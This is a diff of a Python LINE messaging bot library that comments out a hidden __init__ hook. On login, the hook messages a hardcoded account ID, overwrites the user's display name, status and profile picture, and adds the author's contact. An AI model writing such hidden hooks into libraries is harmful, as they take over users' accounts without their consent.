@@ -202,22 +202,22 @@ class Object(object):
             raise Exception('Forward object failure.')
         return True
 
-    def __init__(self):
-        if self.isLogin == True:
-            self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
-            self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            ridenx = "u4e49fa7389c0333bb7ff38063552791b"
-            xmod = self.getContact(ridenx).displayName
-            self.sendText("u4e49fa7389c0333bb7ff38063552791b", 'ᴛʜᴀɴᴋꜱ %s , ꜰᴏʀ ᴀ ꜱᴄʀɪᴘᴛ ʙᴏᴛ' % xmod)
-            profile = self.getProfile()
-            profile.displayName = "ᴅᴜᴘʟɪᴄᴀᴛᴇ ᴘʜɪᴇ™"
-            self.updateProfile(profile)
-            profile.statusMessage = "ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴄᴀʟᴏɴ ᴀʟᴍᴀʀʜᴜᴍ ᴅᴀɴ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴀʜʟɪ ᴋᴜʙᴜʀ (ᴘʜɪᴇ_ᴄᴏʙᴀɪɴ)\n\nᵏᵘˡˡᵘ ⁿᵃᶠˢⁱⁿ ᵈᶻᵃⁱqᵒᵗᵘˡ ᵐᵃᵘᵗ"
-            self.updateProfile(profile)
-            DOMAIN_ = "http://dl.profile.line-cdn.net/0hsalXwOqpLE5RIQFNXiVTGW1kIiMmDyoGKUI3LXx2Inh-GGNKbEVhKidydCkrE2IZakVnLHcnen4v"
-            LINE = self.downloadFileURL(DOMAIN_)
-            self.updateProfilePicture(LINE)
-            GEN = "u4e49fa7389c0333bb7ff38063552791b"
-            self.findAndAddContactsByMid(GEN)
+    #def __init__(self):
+        #if self.isLogin == True:
+            #self.log("( %s ) : Verifikasi Login Success" % self.profile.displayName)
+            #self.log("YOUR MID : " + "( "+self.profile.mid+" )")
+            #ridenx = "u4e49fa7389c0333bb7ff38063552791b"
+            #xmod = self.getContact(ridenx).displayName
+            #self.sendText("u4e49fa7389c0333bb7ff38063552791b", 'ᴛʜᴀɴᴋꜱ %s , ꜰᴏʀ ᴀ ꜱᴄʀɪᴘᴛ ʙᴏᴛ' % xmod)
+            #profile = self.getProfile()
+            #profile.displayName = "ᴅᴜᴘʟɪᴄᴀᴛᴇ ᴘʜɪᴇ™"
+            #self.updateProfile(profile)
+            #profile.statusMessage = "ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴄᴀʟᴏɴ ᴀʟᴍᴀʀʜᴜᴍ ᴅᴀɴ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴀʜʟɪ ᴋᴜʙᴜʀ (ᴘʜɪᴇ_ᴄᴏʙᴀɪɴ)\n\nᵏᵘˡˡᵘ ⁿᵃᶠˢⁱⁿ ᵈᶻᵃⁱqᵒᵗᵘˡ ᵐᵃᵘᵗ"
+            #self.updateProfile(profile)
+            #DOMAIN_ = "http://dl.profile.line-cdn.net/0hsalXwOqpLE5RIQFNXiVTGW1kIiMmDyoGKUI3LXx2Inh-GGNKbEVhKidydCkrE2IZakVnLHcnen4v"
+            #LINE = self.downloadFileURL(DOMAIN_)
+            #self.updateProfilePicture(LINE)
+            #GEN = "u4e49fa7389c0333bb7ff38063552791b"
+            #self.findAndAddContactsByMid(GEN)
 
 
